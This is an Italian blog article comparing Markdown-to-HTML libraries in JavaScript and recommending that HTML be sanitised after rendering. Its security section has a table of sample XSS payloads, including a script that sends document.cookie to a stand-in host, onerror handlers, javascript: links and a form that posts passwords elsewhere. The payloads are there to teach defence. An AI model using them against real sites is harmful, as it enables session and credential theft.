---
title: Renderizzare Markdown in JavaScript senza spedire un buco
description: Confronto tra marked, markdown-it, unified, micromark e snarkdown, con il pattern renderizza-poi-sanifica che tiene l’XSS fuori dall’HTML che spedisci
updated: 2026-09-09
date: 2026-07-24
tag: Codice
keywords: markdown in html javascript, marked js, markdown it, remark, rehype, unified markdown, react markdown, confronto parser markdown, micromark, snarkdown, plugin markdown-it, rehype-sanitize, dompurify markdown, rendering markdown in streaming
---

Tre librerie fanno la maggior parte del lavoro da Markdown a HTML in JavaScript, e rispondono alla stessa domanda: dammi Markdown, restituiscimi HTML. Quello che le separa è la forma — cosa espone il parsing e dove ti agganci. Poi la parte che la maggior parte dei tutorial salta: quello che torna indietro è HTML, e metterlo in una pagina non è sicuro.

La scelta di solito si fa in cinque minuti, da un risultato di ricerca, e poi si convive con essa per quattro anni. Smette di essere economica la prima volta che qualcuno chiede un indice, oppure che i link esterni si aprano in una nuova scheda e quelli interni no, oppure un id di titolo che corrisponda all'ancora a cui un articolo di supporto già rimanda. A quel punto la domanda non è più quale parser sia più veloce. È se la libreria ti ha dato qualcosa a cui aggrapparti.

La seconda cosa che invecchia male è l'input. Un renderer puntato sulla tua propria documentazione è un problema di rendering. Lo stesso renderer puntato su una casella commenti, la descrizione di una pull request, un file caricato da un cliente o l'output di un modello linguistico è un problema di sicurezza, e nessuna di queste librerie lo risolve per te — la più diffusa fra loro lo dice nel proprio README.

### In breve

Usa **marked** quando il lavoro è una stringa in entrata e una in uscita, e personalizzare significa sovrascrivere qualche metodo del renderer. Usa **markdown-it** quando vuoi conformità a CommonMark più un plugin per ogni estensione che prima o poi ti verrà chiesta, e la capacità di cambiare l'output di un tag senza toccare il parsing. Usa **unified** — `remark-parse`, `remark-rehype`, `rehype-stringify` — quando ti serve il documento come albero, perché è l'unica delle tre dove trasformare il contenuto non è chirurgia sulle stringhe. **micromark** è il parser sotto remark ed è la risposta giusta solo se stai costruendo lo strato sopra di esso; **snarkdown** è un kilobyte e un insieme di compromessi. Qualunque tu scelga, sanifica l'HTML dopo con uno strumento il cui unico lavoro è sanificare.

## Tre forme, un solo lavoro

| Libreria | Ideale per | Posizione rispetto alla spec | Come la estendi | Nel browser | Licenza |
| --- | --- | --- | --- | --- | --- |
| marked | Una funzione, poche parti in movimento | GFM attivo di default (`gfm: true`); nessuna dichiarazione formale di conformità nel suo README | `marked.use()` con un renderer, un tokenizer, estensioni personalizzate, hook e `walkTokens` | Sì — browser, Node e una CLI, tutto da un solo pacchetto | Gratis, MIT |
| markdown-it | Correttezza, e un plugin per tutto | Dichiara supporto CommonMark al 100%, con un preset `commonmark` per la modalità rigorosa | `.use(plugin)`, `.enable()` / `.disable()` per regola, e sovrascrivere `md.renderer.rules[name]` | Sì | Gratis, MIT |
| unified (remark + rehype) | Trasformare il documento, non solo renderizzarlo | CommonMark tramite micromark; GFM aggiunto da `remark-gfm` | Plugin che percorrono due alberi sintattici, mdast per il Markdown e hast per l'HTML | Sì, e solo ESM | Gratis, MIT |
| micromark | Costruire uno strato di parser, non un'applicazione | Dichiara conformità CommonMark al 100% ed è il motore dentro remark | Estensioni di sintassi ed estensioni HTML, scritte contro codici di carattere e token | Sì | Gratis, MIT |
| snarkdown | Un kilobyte, quando accetti cosa costa | Nessuna dichiarazione di conformità; le tabelle non sono supportate | Di fatto non estensibile — una sola funzione esportata | Sì | Gratis, MIT |

(Licenze, opzioni e dichiarazioni di conformità verificate su marked.js.org, github.com e cdn.jsdelivr.net, il 9 settembre 2026. In quella tabella non ci sono numeri di benchmark apposta: la velocità è la cosa che ogni confronto misura ed è quella che decide meno di tutte queste scelte.)

marked è la cosa più piccola che funziona. Chiama `marked.parse()`, ottieni HTML. Personalizzare significa sostituire i metodi del renderer — quello che emette un titolo, quello che emette un link — oppure registrare un'estensione per una nuova sintassi. La maggior parte dei lavori non raggiunge mai quel soffitto.

markdown-it analizza in un flusso piatto di token e renderizza quello. I token sono documentati, quindi l'ecosistema di plugin è ampio e i plugin si combinano: ancore, note a piè di pagina, attributi, container. Per cambiare l'output invece della sintassi, sovrascrivi la regola per un tipo di token.

La pipeline unified è diversa per natura. `remark-parse` produce mdast, un albero sintattico Markdown; `remark-rehype` lo converte in hast, un albero HTML; `rehype-stringify` lo stampa. Ogni passaggio in mezzo è un plugin che percorre un albero vero — l'unica delle tre dove puoi raccogliere ogni titolo, o riscrivere percorsi immagine relativi, senza una regex.

Altre due vale la pena conoscerle, ai due estremi opposti. micromark è il parser su cui remark è costruito: legge il Markdown come codici di carattere ed emette token concreti con posizioni, e dichiara piena conformità CommonMark. Lo useresti direttamente per costruire uno strumento sopra il Markdown — un linter, un formattatore, un evidenziatore di sintassi per un editor — piuttosto che per renderizzare una pagina, perché da solo ti dà token e un compilatore, non un documento che puoi percorrere. snarkdown è l'altro estremo: una singola funzione guidata da espressioni regolari, descritta dal suo stesso README come 1kb di ES3 compresso gzip, senza tabelle e senza sanificazione (verificato su github.com, il 9 settembre 2026). Esiste per un widget dove tutto il punto è che non si spedisce nient'altro.

## Le librerie in profondità

### marked — le opzioni che contano

L'API di marked è una chiamata e un oggetto di opzioni, e solo una manciata di quelle opzioni cambia l'aspetto dell'HTML.

| Opzione | Default | Cosa fa |
| --- | --- | --- |
| `gfm` | `true` | GitHub Flavored Markdown: tabelle, barrato, liste di attività, autolink |
| `breaks` | `false` | Un singolo a capo diventa un `<br>`, come si comporta un commento di GitHub |
| `pedantic` | `false` | Segue l'originale `markdown.pl`, bug inclusi, e rinuncia a GFM per farlo |
| `async` | `false` | `walkTokens` può essere asincrono e `marked.parse()` restituisce una promise |
| `silent` | `false` | Gli errori tornano come una stringa invece di essere lanciati |
| `renderer` | un `Renderer` | Le funzioni che trasformano ogni token in HTML |
| `tokenizer` | un `Tokenizer` | Le funzioni che trasformano il testo sorgente in token |
| `walkTokens` | `null` | Chiamata per ogni token, i figli prima dei fratelli |

(Verificato su marked.js.org, il 9 settembre 2026.)

`breaks` è quella su cui le persone sbagliano. La regola del Markdown è che un singolo a capo è uno spazio e una riga vuota è un paragrafo, il che è corretto per la prosa e sbagliato per qualsiasi cosa digitata in una casella di messaggio, dove una persona che preme Invio si aspetta che una riga finisca. Attivare `breaks` è una decisione sui tuoi utenti, non sulla specifica. `pedantic` è un interruttore di compatibilità per documenti scritti contro l'implementazione del 2004, e non è quello che vuoi per qualsiasi cosa scritta in questo decennio.

La trappola più grande sono le opzioni che non ci sono più. marked ha spostato una lunga lista di comportamenti fuori dal core e in pacchetti separati, e un frammento copiato da una vecchia risposta passerà un'opzione che viene ignorata in silenzio invece di essere rifiutata.

| Opzione rimossa | Dove è andata |
| --- | --- |
| `sanitize`, `sanitizer` | Rimossa a favore di un vero sanificatore: DOMPurify, sanitize-html o insane |
| `highlight`, `langPrefix` | `marked-highlight` |
| `headerIds`, `headerPrefix` | `marked-gfm-heading-id` |
| `mangle` | `marked-mangle` |
| `smartypants` | `marked-smartypants` |
| `baseUrl` | `marked-base-url` |
| `xhtml` | `marked-xhtml` |

(Verificato su marked.js.org, il 9 settembre 2026.) La prima riga è quella importante. Se il tuo codice passa `sanitize: true` e credi che quella sia la tua difesa, non hai alcuna difesa.

Personalizzare l'output significa sovrascrivere i metodi del renderer. Ognuno riceve il token e restituisce una stringa, e `this.parser` è disponibile per renderizzare i figli del token.

```js
import { marked } from 'marked';

const slug = (text) =>
  `doc-${text.toLowerCase().trim().replace(/[^\w]+/g, '-').replace(/^-|-$/g, '')}`;

marked.use({
  renderer: {
    heading({ tokens, depth }) {
      const text = this.parser.parseInline(tokens);
      return `<h${depth} id="${slug(text)}">${text}</h${depth}>\n`;
    },
  },
});
```

Il tokenizer è la stessa idea uno stadio prima: sovrascrivi la funzione che riconosce un pezzo di sintassi, restituisci `false` e marked ricade sul default. Usa il renderer per cambiare come qualcosa viene emesso e il tokenizer per cambiare cosa conta come quella cosa fin dall'inizio.

Per sintassi che marked non conosce, registra un'estensione: un `name`, un `level` di `block` o `inline`, uno `start` che dice dove il token potrebbe iniziare, un `tokenizer` che lo produce e un `renderer` che lo stampa. Gli hook stanno del tutto fuori dal parsing — `preprocess` vede il Markdown prima della tokenizzazione, `postprocess` vede l'HTML dopo, e `processAllTokens` vede l'intero array di token in mezzo. Un hook `preprocess` è il posto più ordinato per rimuovere il front matter YAML, che altrimenti si renderizza come un paragrafo di righe `key: value` in cima alla pagina.

L'evidenziazione della sintassi ora è `marked-highlight`, che avvolge un evidenziatore a tua scelta e aggiunge i nomi di classe all'elemento `<code>`.

```js
import { Marked } from 'marked';
import { markedHighlight } from 'marked-highlight';
import hljs from 'highlight.js';

const marked = new Marked(
  markedHighlight({
    langPrefix: 'hljs language-',
    highlight(code, lang) {
      const language = hljs.getLanguage(lang) ? lang : 'plaintext';
      return hljs.highlight(code, { language }).value;
    },
  }),
);
```

Due cose da notare. `langPrefix` ha come default `language-`, quindi un fence `js` produce `class="language-js"` — e qualunque classe si aspetti il tuo foglio di stile deve corrispondere, il che è la solita ragione per cui l'evidenziazione viene applicata e resta invisibile. E il markup che l'evidenziatore emette sono elementi `<span>` con classi, che il tuo sanificatore deve permettere o toglierà via l'evidenziazione dopo che l'hai pagata. [Cosa serve ai blocchi di codice sulla pagina](/blog/code-blocks-in-markdown) copre il resto. Gli evidenziatori asincroni funzionano se imposti `async: true` e attendi il parsing con await. (`marked-highlight` è gratis e con licenza MIT; il suo default per `langPrefix` e il suo supporto asincrono sono stati verificati su github.com, il 9 settembre 2026.)

marked ha licenza MIT, gira in un browser, in Node e dalla sua propria CLI, e il suo README dice chiaramente che non sanifica il suo output (verificato su github.com, il 9 settembre 2026).

### markdown-it — preset, regole e l'ecosistema di plugin

markdown-it analizza in un flusso piatto di token e renderizza quel flusso, ed entrambe le metà sono aperte. Parte da un preset, e i preset differiscono in modi che contano più di quanto i loro nomi suggeriscano.

| Preset | `html` | `maxNesting` | Regole abilitate |
| --- | --- | --- | --- |
| `'default'` (o niente) | `false` | `100` | Tutto quello che markdown-it implementa, incluse tabelle e barrato |
| `'commonmark'` | `true` | `20` | CommonMark rigoroso, niente oltre |
| `'zero'` | `false` | `20` | Solo paragrafi e testo — abiliti il resto per nome |

(Letto dai file dei preset su cdn.jsdelivr.net, il 9 settembre 2026.)

Rileggi la colonna centrale. `new MarkdownIt('commonmark')` attiva l'HTML grezzo, perché la specifica CommonMark dice che l'HTML grezzo passa attraverso. Chiedere il preset più rigoroso rende il tuo renderer meno sicuro, non di più, ed è un risultato davvero sorprendente a cui arrivare scegliendo l'opzione che suona più rigorosa.

Il preset `zero` è l'opposto ed è sottoutilizzato. Abilita `paragraph`, `text` e le regole di unione, e nient'altro; poi chiami `md.enable(['emphasis', 'link', 'backticks'])` e hai un renderer che dimostrabilmente non può produrre un titolo o una tabella. Per un nome visualizzato, un messaggio di commit o un campo commento di una riga, è una risposta molto migliore di un parser completo seguito da un sanificatore aggressivo.

Le opzioni sopra un preset:

| Opzione | Default | Cosa fa |
| --- | --- | --- |
| `html` | `false` | Lascia passare l'HTML grezzo invece di fargli escape |
| `xhtmlOut` | `false` | Emette `<br />` invece di `<br>` |
| `breaks` | `false` | Un singolo a capo diventa un `<br>` |
| `langPrefix` | `'language-'` | Prefisso di classe sui blocchi di codice delimitati |
| `linkify` | `false` | Trasforma gli URL nudi nel testo in link |
| `typographer` | `false` | Virgolette intelligenti, trattini e altre sostituzioni |
| `quotes` | virgolette curve | Quali caratteri di virgoletta sostituisce `typographer` |
| `highlight` | `null` | Una funzione che restituisce HTML evidenziato per un blocco di codice |
| `maxNesting` | `100` (`20` nei preset rigorosi) | Limite di ricorsione, per impedire a un documento costruito ad arte di esaurire lo stack |

(Default letti dagli stessi file dei preset su cdn.jsdelivr.net, il 9 settembre 2026.)

`linkify` è quella su cui pensare prima di abilitarla. Riscrive testo che l'autore non aveva marcato come link, il che è comodo in un messaggio di chat e sbagliato in una documentazione dove `example.com/path` dentro una frase era destinato a essere letto, non cliccato. `typographer` è simile: cambia i caratteri nel tuo testo, il che è delizioso in un saggio e distruttivo in un documento dove qualcuno ha digitato `--` perché significava qualcosa. Nessuna delle due è attiva di default, ed entrambe meritano una decisione invece di un default.

`maxNesting` non è cosmetico. Enfasi o blockquote annidati in profondità sono un classico input di denial-of-service per un parser ricorsivo, e un limite è quello che impedisce a un file di 4 KB di portarsi dietro un thread di richiesta.

L'ecosistema di plugin è la vera ragione per scegliere markdown-it. Il suo README rimanda alla keyword `markdown-it-plugin` su npm per quelli scritti dalla community (verificato su github.com, il 9 settembre 2026), e si combinano, perché estendono tutti la stessa catena di regole documentata: note a piè di pagina, liste di definizioni, container (`::: warning`), attributi, ancore, indice, liste di attività, abbreviazioni, emoji. Dove marked ti chiede di scrivere un'estensione, markdown-it di solito ne ha già una, e aggiungerla è una sola chiamata `.use()`. La qualità varia, e un plugin che non è stato aggiornato dall'ultima versione maggiore è un costo vero — controllalo prima di costruirci sopra.

Per cambiare l'output invece della sintassi, sovrascrivi una regola del renderer. Questo è il pattern per aggiungere una classe o un attributo, ed è documentato sulla pagina di architettura del progetto stesso:

```js
const defaultRender = md.renderer.rules.link_open || function (tokens, idx, options, env, self) {
  return self.renderToken(tokens, idx, options);
};

md.renderer.rules.link_open = function (tokens, idx, options, env, self) {
  tokens[idx].attrSet('target', '_blank');
  tokens[idx].attrSet('rel', 'noopener noreferrer');
  return defaultRender(tokens, idx, options, env, self);
};
```

(Pattern dalla documentazione di architettura di markdown-it, verificato su github.com, il 9 settembre 2026; la riga `rel` è l'aggiunta che vuoi se hai intenzione di aprire affatto un link in una nuova scheda.) Mantieni il riferimento alla regola precedente e chiamala. Sovrascrivere senza ricadere sul default è come le persone perdono l'attributo `title` e non se ne accorgono mai, perché niente dà errore — l'attributo semplicemente smette di comparire.

markdown-it è gratis e con licenza MIT, e gira in un browser. La documentazione stessa di VS Code dice che la sua anteprima Markdown punta a CommonMark usando markdown-it (verificato su code.visualstudio.com, il 9 settembre 2026), il che è un giusto avallo della sua conformità e il motivo per cui un documento che si vede correttamente in anteprima nel tuo editor è un buon segno, non una garanzia.

### unified — due alberi e i plugin in mezzo

La pipeline unified non è un parser con hook. È una sequenza di piccoli pacchetti, ognuno dei quali trasforma un albero, e capirla significa capire che ci sono due alberi.

**mdast** è l'albero Markdown. I suoi nodi sono le cose che il Markdown ha: `heading`, `list`, `listItem`, `link`, `image`, `code`, `blockquote`, `text`. **hast** è l'albero HTML. I suoi nodi sono `element`, `text` e `comment`, con nomi di tag e proprietà. Un titolo in mdast ha un `depth` di 2; lo stesso titolo in hast è un `element` con `tagName: 'h2'`. Qualsiasi cosa tu voglia fare in termini di *documento* — raccogliere i titoli, controllare che ogni link si risolva, riscrivere percorsi immagine relativi, imporre che ogni immagine abbia il testo alternativo — è un lavoro mdast. Qualsiasi cosa tu voglia fare in termini di *markup* — aggiungere una classe, avvolgere le tabelle in un contenitore scorrevole, aggiungere `loading="lazy"` — è un lavoro hast. Scegliere l'albero sbagliato è la ragione più comune per cui un plugin unified ti dà battaglia.

| Passaggio | Pacchetto | Cosa esce |
| --- | --- | --- |
| Parsing | `remark-parse` | mdast |
| Estendere la sintassi | `remark-gfm`, `remark-frontmatter`, `remark-math` | mdast |
| Trasformare il contenuto | un tuo plugin, `unist-util-visit` | mdast |
| Ponte | `remark-rehype` | hast — l'HTML grezzo viene scartato a meno che tu non passi `allowDangerousHtml` |
| Ri-analizzare l'HTML incorporato | `rehype-raw` | hast con quell'HTML come nodi veri |
| Sanificare | `rehype-sanitize` | hast, filtrato contro uno schema |
| Serializzare | `rehype-stringify` | una stringa HTML |

Una pipeline completa che accetta HTML grezzo e sopravvive a esso appare così:

```js
import { unified } from 'unified';
import remarkParse from 'remark-parse';
import remarkGfm from 'remark-gfm';
import remarkRehype from 'remark-rehype';
import rehypeRaw from 'rehype-raw';
import rehypeSanitize from 'rehype-sanitize';
import rehypeStringify from 'rehype-stringify';

const processor = unified()
  .use(remarkParse)
  .use(remarkGfm)
  .use(remarkRehype, { allowDangerousHtml: true })
  .use(rehypeRaw)
  .use(rehypeSanitize)
  .use(rehypeStringify);

const html = String(await processor.process(markdown));
```

L'ordine è l'intero modello di sicurezza. `remark-rehype` scarta l'HTML grezzo di default, il che è sicuro e di solito non è quello che vuoi; `allowDangerousHtml` lo tiene come nodo grezzo, `rehype-raw` lo analizza in elementi veri come farebbe un browser, e `rehype-sanitize` poi filtra quegli elementi contro uno schema. La guida stessa del progetto è di usarlo “after the last unsafe thing” (README di rehype-sanitize, verificato su github.com, il 9 settembre 2026) — metti un plugin che inietta markup dopo il sanificatore e l'hai messo fuori dal sanificatore. `rehype-sanitize` ha come default uno schema in stile GitHub, un punto di partenza sensato e deliberato: è l'insieme di tag che GitHub stesso ha deciso di permettere in un README.

`remark-gfm` aggiunge cinque cose e vale la pena nominarle, perché ognuna è un fallimento silenzioso specifico se manca: autolink letterali, note a piè di pagina, barrato, tabelle e liste di attività. Ha licenza MIT, come il resto (verificato su github.com, il 9 settembre 2026). Quali di queste servano ai tuoi file è una domanda sui tuoi file, e le differenze di dialetto dietro di essa vale la pena leggerle una volta.

La ragione per accollarsi tutto questo meccanismo è il centro della tabella. Un plugin è una funzione che restituisce un transformer, e a un transformer viene consegnato l'albero:

```js
import { visit } from 'unist-util-visit';

const rewriteRelativeImages = (base) => () => (tree) => {
  visit(tree, 'image', (node) => {
    if (!/^[a-z][a-z0-9+.-]*:|^\/\//i.test(node.url)) {
      node.url = new URL(node.url, base).href;
    }
  });
};
```

Sono nove righe, è corretto per ogni immagine nel documento incluse quelle dentro il testo dei link e le celle di tabella, e non esiste una versione di questo in marked o markdown-it che non comporti o intercettare un metodo del renderer un nodo alla volta o eseguire un'espressione regolare sull'HTML finito. Quando il compito è “fai qualcosa a ogni X nel documento”, un albero non è una risposta più pesante, è l'unica risposta che non finisce prima o poi per rompersi su un caso a cui non avevi pensato.

I costi sono reali e sono trattati più avanti. Uno di essi vale la pena segnalarlo qui: i pacchetti unified dichiarano di essere solo ESM (verificato su github.com, il 9 settembre 2026), il che è un blocco netto in una build CommonJS più vecchia che non può usare un `import()` dinamico.

### react-markdown — la pipeline, renderizzata come componenti

In React, `react-markdown` si appoggia sulla pipeline unified e renderizza elementi React invece di una stringa HTML, quindi nessun `dangerouslySetInnerHTML` è coinvolto. Il suo README dichiara che è sicuro di default e costruisce un DOM virtuale dall'albero sintattico, così React applica solo le patch di quello che è cambiato (verificato su github.com, il 9 settembre 2026). Ha licenza MIT.

```jsx
import Markdown from 'react-markdown';
import remarkGfm from 'remark-gfm';

<Markdown
  remarkPlugins={[remarkGfm]}
  components={{
    a: ({ href, children }) => <Link to={href}>{children}</Link>,
    code: CodeBlock,
  }}
>
  {text}
</Markdown>;
```

La prop `components` è la parte che se lo merita. Ogni elemento HTML che la pipeline avrebbe prodotto può essere sostituito da uno tuo, così un link diventa il link del tuo router, un fence di codice diventa il tuo blocco evidenziato con un pulsante copia, e un'immagine diventa il tuo componente immagine a caricamento lento — senza generare HTML e rianalizzarlo. `remarkPlugins` e `rehypePlugins` accettano gli stessi plugin di qualsiasi altra pipeline unified, con le opzioni passate come `[[plugin, options]]`.

Due note di sicurezza, entrambe dalla documentazione stessa del progetto. L'HTML grezzo nel sorgente viene ignorato a meno che tu non aggiunga `rehype-raw`, e la sua guida dice di farlo solo se ti fidi del Markdown; aggiungere `rehype-sanitize` insieme è la risposta quando non ti fidi. E `urlTransform` — l'hook che decide cosa diventa l'URL di un link o di un'immagine — è l'unico posto dove puoi reintrodurre un buco XSS in un componente altrimenti sicuro, sovrascrivendolo con qualcosa che lascia passare `javascript:`.

### MDX — una cosa del tutto diversa

MDX sembra il passo successivo dopo react-markdown e non è affatto sullo stesso asse. MDX è un formato di file che combina Markdown con JSX e istruzioni ESM `import` ed `export`, e compila in un componente JavaScript (verificato su mdxjs.com, il 9 settembre 2026). L'output è codice.

Quella distinzione decide tutto su dove appartiene. Un renderer Markdown prende testo a runtime e produce markup; MDX prende un file sorgente a build time e produce un modulo che gira. La sanificazione non è un passaggio in una pipeline MDX perché non c'è niente da sanificare — al file è stato permesso di eseguirsi per progetto. MDX è lo strumento giusto per documentazione e pagine di marketing che vivono nel tuo repository e hanno bisogno di componenti interattivi dentro la prosa, il che è il motivo per cui i framework di documentazione lo usano — Docusaurus compila sia `.md` che `.mdx` con il compilatore MDX (verificato su docusaurus.io, il 9 settembre 2026). È categoricamente lo strumento sbagliato per qualsiasi contenuto che arriva da un utente, un cliente, una API o un modello. Se l'input non è scritto da qualcuno con accesso al commit, MDX non è in gioco, e nessun flag di configurazione cambia questo.

## Quale delle due è la risposta migliore

La domanda che le separa non è la velocità, è se ti servirà mai il documento come dato. Per Markdown fidato renderizzato in una pagina e nient'altro, marked o markdown-it bastano. Per un indice, il controllo dei link o qualsiasi trasformazione che dipende dalla struttura, remark e rehype sono la risposta giusta, e le altre due si trasformano in chirurgia sulle stringhe. Quanto costa indovinare male nella direzione opposta ha una sezione a sé più avanti.

I loro default differiscono nel dialetto, il che si manifesta come output mancante, non come errore. marked ha GitHub Flavored Markdown dietro un'opzione `gfm`, attiva di default. markdown-it abilita tabelle e barrato nel suo preset di default ma lascia le liste di attività a un plugin. unified prende tutto da `remark-gfm`. Se un documento arriva senza le sue tabelle o le sue liste di attività, controlla prima il dialetto — vedi [CommonMark, GFM e i dialetti](/blog/commonmark-gfm-and-the-flavours).

Detto come tabella di consultazione, perché la maggior parte di queste decisioni è lunga una riga:

| Cosa stai costruendo | Prendi |
| --- | --- |
| Una casella commenti, un pannello di anteprima, un fumetto di chat | marked, con un sanificatore |
| Un README renderizzato nella tua propria app | marked o markdown-it, quello che c'è già |
| Una build di documentazione che aggiunge ancore, container e note a piè di pagina | markdown-it, e i suoi plugin |
| Un campo a una riga: un nome visualizzato, l'oggetto di un commit | markdown-it con il preset `zero` e tre regole abilitate |
| Un indice, il controllo dei link, il linting sullo stile della casa | unified, su mdast |
| Riscrivere URL, aggiungere classi, avvolgere elementi | unified, su hast |
| Un'applicazione React | react-markdown, con `components` |
| Prosa con componenti interattivi, scritta dal tuo proprio team | MDX, a build time |
| Un widget dove il bundle è il vincolo | snarkdown, sapendo cosa non fa |
| Un linter o un formattatore sopra il Markdown stesso | micromark, o mdast direttamente |

## Il buco: analizzare non è sanificare

Il Markdown permette l'HTML grezzo per progetto, quindi qualsiasi parser che rispetti la specifica lascia passare `<img src=x onerror=alert(1)>` dritto nella tua pagina. marked una volta portava un'opzione `sanitize`; è stata deprecata e poi rimossa a favore di un sanificatore dedicato. markdown-it ha come default `html: false`, che chiude la porta più larga, ma la destinazione di un link resta comunque input di un attaccante.

Le tre librerie prendono tre posizioni su questo, e nessuna di esse è “ci penseremo noi”:

| | marked | markdown-it | unified (remark + rehype) |
| --- | --- | --- | --- |
| Output | Una stringa HTML | Una stringa HTML, tramite token | Un albero, serializzato alla fine |
| HTML grezzo | Lasciato passare | Con escape di default (`html: false`), lasciato passare nel preset `commonmark` | Scartato a meno di `allowDangerousHtml` e `rehype-raw` |
| Sanificazione | Nessuna | Nessuna | `rehype-sanitize`, se lo aggiungi |
| Cosa dice il progetto | Usa DOMPurify, sanitize-html o insane sull'HTML di output | Niente ha l'escape una volta che imposti `html: true` — e il preset `commonmark` lo imposta | `allowDangerousHtml` è pericoloso; usa `rehype-sanitize` dopo |

Quindi: renderizza, poi sanifica con uno strumento il cui unico lavoro è sanificare, sempre in quest'ordine.

La ragione per cui l'ordine non è negoziabile è che sanificare il sorgente Markdown non funziona. Il Markdown ha troppi modi di scrivere lo stesso output — link per riferimento, escape di entità, autolink, commenti HTML — quindi un filtro sul sorgente è un filtro su una sola grafia. L'HTML è l'unica rappresentazione dove la cosa su cui stai decidendo è inequivocabile, perché è la cosa che il browser riceverà davvero.

Quello che un sanificatore deve fermare è una lista più lunga di quella che la maggior parte delle persone tiene in testa:

| Vettore | Che aspetto ha | Cosa lo ferma |
| --- | --- | --- |
| Elemento script | `<script>fetch('//x/'+document.cookie)</script>` | `script` non è nella allow-list dei tag |
| Attributo gestore di eventi | `<img src=x onerror=alert(1)>` | `on*` non è nella allow-list degli attributi |
| URL `javascript:` | `[click me](javascript:alert(1))` | Una allow-list di schemi su `href` e `src` |
| URL `data:` che porta markup | `<iframe src="data:text/html,<script>…">` | `iframe` disattivato; allow-list di schemi su `src` |
| SVG con script o gestori | `<svg><script>…</script></svg>` | SVG disattivato a meno che tu non abbia davvero bisogno di SVG inline |
| Stile inline e CSS che fa fetch | `<div style="background:url(//x)">` | Scarta `style`, tieni `class` |
| Modulo che invia altrove | `<form action="//x"><input name=pw>` | `form`, `input`, `button` fuori dalla lista |
| `<base>` che riscrive ogni link relativo | `<base href="//x/">` | `base` fuori dalla lista |
| `meta refresh` che reindirizza la pagina | `<meta http-equiv=refresh content=…>` | `meta` fuori dalla lista |
| DOM clobbering tramite `id` o `name` | `<a id="config">` che fa ombra a un globale | Metti un prefisso agli id, o rimuovili |
| Annidamento abbastanza profondo da esaurire lo stack | Centinaia di blockquote annidati | Un limite di annidamento del parser, prima del sanificatore |

Il caso completo per costruire questo come una allow-list invece di una block-list è un pezzo a parte; la versione breve è che una block-list è una lista degli attacchi a cui qualcuno ha già pensato.

### Quale sanificatore, e dove appartiene

| Sanificatore | Gira dove | Ha bisogno di un DOM | Configurato con | Licenza |
| --- | --- | --- | --- | --- |
| DOMPurify | Nativamente nel browser; in Node con jsdom | Sì | `ALLOWED_TAGS`, `ALLOWED_ATTR`, `USE_PROFILES`, hook | Gratis, Apache-2.0 o MPL-2.0 |
| sanitize-html | Node, e impacchettato per il browser | No — analizza con htmlparser2 | `allowedTags`, `allowedAttributes`, `allowedSchemes`, `transformTags` | Gratis, MIT |
| rehype-sanitize | Ovunque giri unified | No — filtra hast | Uno schema, in stile GitHub di default | Gratis, MIT |

(Licenze e opzioni di configurazione verificate su github.com, il 9 settembre 2026. Il repository autonomo di sanitize-html è stato archiviato a febbraio 2026 e il pacchetto si è spostato nel monorepo di ApostropheCMS, cosa che vale la pena sapere prima di aprire un issue su quello vecchio.)

Scegli in base a dove gira il codice, non alla reputazione. DOMPurify è la risposta giusta in un browser, dove usa il parser stesso del browser e quindi vede esattamente quello che vedrà il browser — incluso il recupero contorto che un parser vero fa sul markup rotto, il punto dove un filtro basato su corrispondenza di stringhe perde. Ha hook, e `SANITIZE_NAMED_PROPS` per il DOM clobbering. rehype-sanitize è la risposta giusta se hai già una pipeline unified, perché filtra l'albero sul posto e non c'è mai un momento in cui l'HTML non sicuro esiste come stringa. sanitize-html è la risposta giusta quando ti serve un'implementazione sola che si comporta in modo identico in Node e nel browser senza un'implementazione di DOM sotto.

## Renderizza, poi sanifica, nel browser

DOMPurify è la scelta standard. Dagli una allow-list esplicita invece del default: la allow-list è il formato di documento che hai deciso di supportare.

```js
import { marked } from 'marked';
import DOMPurify from 'dompurify';

export const ALLOWED_TAGS = [
  'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'p', 'br', 'hr', 'strong', 'em', 'del',
  'ul', 'ol', 'li', 'blockquote', 'pre', 'code', 'table', 'thead', 'tbody',
  'tr', 'th', 'td', 'a', 'img', 'input',
];

export const ALLOWED_ATTR = [
  'href', 'src', 'alt', 'title', 'id', 'class', 'target', 'rel',
  'type', 'checked', 'disabled', 'colspan', 'rowspan',
];

export function render(markdown) {
  const html = marked.parse(markdown, { gfm: true });
  return DOMPurify.sanitize(html, { ALLOWED_TAGS, ALLOWED_ATTR });
}
```

Tieni entrambi gli array in un solo modulo ed esportali. Nel momento in cui lo stesso documento viene renderizzato da qualche altra parte, devono corrispondere esattamente.

### La stessa allow-list sul server

DOMPurify ha bisogno di un vero DOM e il server non ne ha. Un surrogato scadente è peggio di niente: senza un DOM utilizzabile, DOMPurify restituisce l'input invariato invece di lanciare un'eccezione, tag script incluso. O gli dai jsdom, oppure usi un sanificatore che analizza l'HTML da sé, come `xss`.

```js
import { marked } from 'marked';
import { FilterXSS } from 'xss';
import { ALLOWED_ATTR, ALLOWED_TAGS } from './allow-list.js';

const filter = new FilterXSS({
  whiteList: Object.fromEntries(ALLOWED_TAGS.map((tag) => [tag, [...ALLOWED_ATTR]])),
  stripIgnoreTag: true,
  stripIgnoreTagBody: ['script', 'style', 'iframe', 'object', 'embed'],
});

export const render = (markdown) =>
  filter.process(marked.parse(markdown, { gfm: true }));
```

`stripIgnoreTag` rimuove un tag sconosciuto invece di fargli escape, che è il default; `stripIgnoreTagBody` prende anche il suo contenuto, così uno `<script>` rimosso non lascia dietro alcun sorgente. Il pacchetto `xss` è gratis e con licenza MIT, e analizza l'HTML da sé invece di chiedere un DOM, il che è quello che lo rende usabile in una funzione senza jsdom dentro (`FilterXSS`, `whiteList`, `stripIgnoreTag` e `stripIgnoreTagBody` verificati su github.com, il 9 settembre 2026).

Ecco come è costruito TransformPipe: marked per il parsing, DOMPurify nel browser, il pacchetto `xss` sul server, una sola allow-list importata da entrambi, così un documento si legge allo stesso modo nell'app e su una pagina condivisa. Un dettaglio che vale la pena rubare: gli id dei titoli ottengono un prefisso `doc-`. Un id diventa una proprietà con nome su `window`, e DOMPurify rimuove gli id che sembrano rischi di clobbering mentre un sanificatore basato su parser li tiene — il prefisso chiude entrambi i problemi. Il caso per le allow-list è in [sanificare Markdown in sicurezza](/blog/sanitising-markdown-safely); gli stessi due passaggi in Python sono in [Markdown in HTML in Python](/blog/markdown-to-html-in-python).

## Renderizzare l'output di un modello mentre arriva in streaming

